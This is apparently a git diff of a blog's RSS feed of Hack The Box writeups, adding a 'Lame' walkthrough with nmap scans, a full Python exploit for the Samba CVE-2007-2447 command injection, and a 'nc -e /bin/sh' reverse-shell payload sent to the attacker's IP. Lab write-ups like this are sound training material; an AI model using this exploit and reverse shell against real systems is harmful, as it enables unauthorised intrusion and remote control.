@@ -525,6 +525,8 @@ http://10.10.11.10:8080/ [200 OK] Cookies[JSESSIONID.678bd8a0], Country[RESERVED
 &lt;pre&gt;&lt;code&gt;ssh -i id_rsa root@10.10.11.10
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img src=&quot;./img/12.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>Crafty HTB Writeup</title><link>https://fuwari.vercel.app/posts/crafty/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/crafty/</guid><description>Easy Machine</description><pubDate>Sat, 06 Jul 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Hola&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/image.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
 </content:encoded></item><item><title>Devvortex HTB Writeup</title><link>https://fuwari.vercel.app/posts/devvortex/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/devvortex/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
 &lt;p&gt;We start our scanning with nmap:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap 10.10.11.242 -sS --open --min-rate 3000 -p- -n -Pn -oN Nmapscan
@@ -1735,6 +1737,128 @@ Notes: PuTTY-User-Key-File-3: ssh-rsa
 &lt;pre&gt;&lt;code&gt;&amp;gt; id
 uid=0(root) gid=0(root) groups=0(root)
 &lt;/code&gt;&lt;/pre&gt;
+</content:encoded></item><item><title>Lame HTB Writeup</title><link>https://fuwari.vercel.app/posts/lame/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/lame/</guid><description>Easy Machine</description><pubDate>Sat, 06 Jul 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Information Gathering&lt;/h1&gt;
+&lt;p&gt;Scanned all TCP ports:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -sS -p- --open --min-rate 5000 -Pn -n 10.10.10.3  -oG nmap
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3632/tcp open  distccd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Enumerated open TCP ports:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -p21,22,139,445,3632 -sVC 10.10.10.3 -Pn
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.170
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_smb2-time: Protocol negotiation failed (SMB2)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2024-07-04T14:04:23-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 2h00m31s, deviation: 2h49m45s, median: 29s
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h1&gt;Enumeration&lt;/h1&gt;
+&lt;h2&gt;Port 445 - SMB (Samba smbd 3.0.20)&lt;/h2&gt;
+&lt;p&gt;search in google for &lt;code&gt;Samba smbd 3.0.20 exploit&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;There are many options to use, I recommend you try several and understand how they work, in this case I will use this one:
+&lt;a href=&quot;https://github.com/Ziemni/CVE-2007-2447-in-Python&quot;&gt;CVE&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/python3
+
+import sys
+try:
+    from smb.SMBConnection import SMBConnection
+except:
+    print(&quot;pysmb is not installed: python3 -m pip install pysmb&quot;)
+    quit()
+
+if not (2 &amp;lt; len(sys.argv) &amp;lt; 5):
+    print(&quot;Usage:&quot;)
+    print(&quot;    python3 smbExploit.py &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt; &amp;lt;PAYLOAD&amp;gt;&quot;)
+    print(&quot;       IP - Ip of the remote machine.&quot;)
+    print(&quot;       PORT - (Optional) Port that smb is running on.&quot;)
+    print(&quot;       PAYLOAD - Payload to be executed on the remote machine e.g. reverse shell.&quot;)
+    print(&quot;&quot;)
+    print(&quot;Example: python3 smbExploit.py 192.168.1.2 139 &apos;nc -e /bin/sh 192.168.1.1 4444&apos;&quot;)
+    quit()
+
+if len(sys.argv) == 3:
+    ip = sys.argv[1]
+    port = 139
+    payload = sys.argv[2]
+else:
+    ip = sys.argv[1]
+    port = sys.argv[2]
+    payload = sys.argv[3]
+
+user = &quot;`&quot; + payload + &quot;`&quot;
+conn = SMBConnection(user, &quot;na&quot;, &quot;na&quot;, &quot;na&quot;, use_ntlm_v2=False)
+
+try:
+    print(&quot;[*] Sending the payload&quot;)
+    conn.connect(ip, int(port))
+    print(&quot;[*] Payload was send successfully&quot;)
+    quit()
+except Exception as e:
+    print(&quot;[*] Something went wrong&quot;)
+    print(&quot;ERROR:&quot;)
+    print(e)
+    quit()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h1&gt;Exploitation&lt;/h1&gt;
+&lt;h2&gt;CVE-2007-2447: Remote Command Injection&lt;/h2&gt;
+&lt;p&gt;We listen to netcat on port &lt;code&gt;4444&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nc -nlvp 4444
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The exploit guide tells us to run it this way:&lt;/p&gt;
+&lt;h2&gt;Python Script&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;python3 smbExploit.py 10.10.10.3 445 &apos;nc -e /bin/sh 10.10.14.170 4444&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We run the exploit with &lt;code&gt;python3&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Enter the &lt;code&gt;IP&lt;/code&gt; of the victim machine.&lt;/li&gt;
+&lt;li&gt;Set the port of the vulnerable &lt;code&gt;SMB&lt;/code&gt;, which in this case is the default &lt;code&gt;445&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Then inside quotes we execute the Revshell with netcat, placing the type of shell that we want, our IP and the port in listening that in this case is &lt;code&gt;4444&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Starts a Bash shell session within which you can run commands interactively, but without saving any session logs, since everything is discarded in &lt;code&gt;/dev/null&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;script /dev/null -c bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We already have root&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
 </content:encoded></item><item><title>MonitorsTwo HTB Writeup</title><link>https://fuwari.vercel.app/posts/monitorstwo/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/monitorstwo/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
 &lt;p&gt;We check the connection with the victim machine:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;&amp;gt; ping -c 1 10.10.11.211 
